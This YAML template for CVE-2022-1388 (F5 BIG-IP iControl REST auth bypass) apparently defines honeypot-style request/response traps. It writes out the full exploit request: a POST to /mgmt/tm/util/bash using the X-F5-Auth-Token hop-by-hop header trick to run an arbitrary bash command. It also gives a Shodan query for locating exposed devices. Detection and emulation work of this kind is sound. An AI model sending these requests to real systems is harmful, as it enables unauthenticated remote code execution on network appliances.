id: CVE-2022-1388
info:
  name: F5 BIG-IP iControl - REST Auth Bypass RCE
  author: dwisiswant0,Ph33r
  description: 'F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior
    to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5,
    and all 12.1.x and 11.6.x versions, may allow undisclosed requests to bypass iControl
    REST authentication.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass authentication and execute arbitrary code on the affected system.

    '
  remediation: 'Apply the necessary security patches or updates provided by F5 Networks
    to mitigate this vulnerability.

    '
  reference:
  - https://twitter.com/GossiTheDog/status/1523566937414193153
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  - https://support.f5.com/csp/article/K23605346
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
  - https://www.secpod.com/blog/critical-f5-big-ip-remote-code-execution-vulnerability-patch-now/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1388
    cwe-id: CWE-306
    epss-score: 0.97477
    epss-percentile: 0.99964
    cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: f5
    product: big-ip_access_policy_manager
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
  tags: cve,cve2022,f5,bigip,rce,mirai,kev
traps:
- request:
    method: POST
    path: /mgmt/tm/util/bash
    headers:
      Connection: keep-alive, X-F5-Auth-Token
      X-F5-Auth-Token: a
      Authorization: Basic {{base64(auth)}}
      Content-Type: application/json
    body: |
      {
           "command": "run",
           "utilCmdArgs": "-c '{{cmd}}'"
      }
  response:
    status_code: 200
    headers: {}
    body: commandResult8831-2202-EVC
- request:
    method: POST
    path: /mgmt/tm/util/bash
    headers:
      Host: localhost
      Connection: keep-alive, X-F5-Auth-Token
      X-F5-Auth-Token: a
      Authorization: Basic {{base64(auth)}}
      Content-Type: application/json
    body: |
      {
           "command": "run",
           "utilCmdArgs": "-c '{{cmd}}'"
      }
  response:
    status_code: 200
    headers: {}
    body: ''
